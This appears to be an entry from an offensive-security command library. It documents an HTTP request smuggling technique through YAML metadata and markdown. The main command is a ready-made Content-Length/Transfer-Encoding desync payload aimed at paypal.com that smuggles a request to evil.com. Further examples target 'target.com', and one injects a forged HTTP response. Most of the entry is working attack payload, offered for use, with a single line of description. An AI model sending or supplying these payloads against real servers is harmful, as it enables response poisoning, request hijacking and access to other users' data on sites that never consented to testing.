---
data: |-
  POST /signin HTTP/1.1
  Host: paypal.com
  Content-Length: 0
  Transfer-Encoding: chunked

  0

  GET /attacker HTTP/1.1
  Host: evil.com
tags:
  - http-request-smuggling
type: command
executor: http
platforms:
  - Web
id: 2c2b6338-b6a0-4990-8af3-f5a5acb4f5ea
created_at: '2025-12-11T03:47:56.906Z'
updated_at: '2025-12-11T03:47:56.906Z'
verified: false
validated: true
submitted: true
---
# craft-smuggled-http-request

## Command

```http
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /attacker HTTP/1.1
Host: evil.com
```

## Description

Crafts an HTTP request with conflicting headers to smuggle a secondary request, used for exploiting parsing desyncs in web servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Content-Length` | Sets a false length to desync | Yes |
| `Transfer-Encoding` | Enables chunked encoding for smuggling | Yes |

## Examples

### Basic Usage

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Host: target.com
```

### Advanced Usage

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

HTTP/1.1 200 OK
Content-Type: text/html

Injected content
```

## Expected Output

Server processes the primary request but smuggles the secondary, potentially returning a mixed response.

## Related

- [[commands/send-poisoned-redirect]]
- [[procedures/Perform-HTTP-Request-Smuggling]]
